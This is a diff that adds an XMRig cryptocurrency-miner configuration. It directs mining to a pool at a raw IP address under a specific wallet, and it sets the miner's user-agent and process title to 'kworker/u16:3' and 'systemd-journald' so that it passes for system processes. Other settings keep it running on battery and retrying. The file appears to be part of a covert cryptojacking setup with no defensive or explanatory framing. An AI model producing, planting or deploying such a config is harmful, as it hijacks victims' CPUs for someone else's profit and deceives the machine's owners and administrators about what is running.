@@ -1,0 +1,26 @@
+{
+  "autosave": true,
+  "cpu": true,
+  "background": false,
+  "pools": [
+    {
+      "url": "159.65.167.171:443",      
+      "user": "85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp",  
+      "pass": "Danis",
+      "keepalive": true,
+      "tls": true
+    }
+  ],
+  "api": {
+    "port": 0                             
+  },
+  "print-time": 60,                          
+  "pause-on-battery": false,
+  "retries": 5,
+  "retry-pause": 5,
+  "donate-level": 1,                         
+  "log-file": "xmrig.log",                   
+  "syslog": false,
+  "user-agent": "kworker/u16:3",             
+  "title": "systemd-journald"                
+}
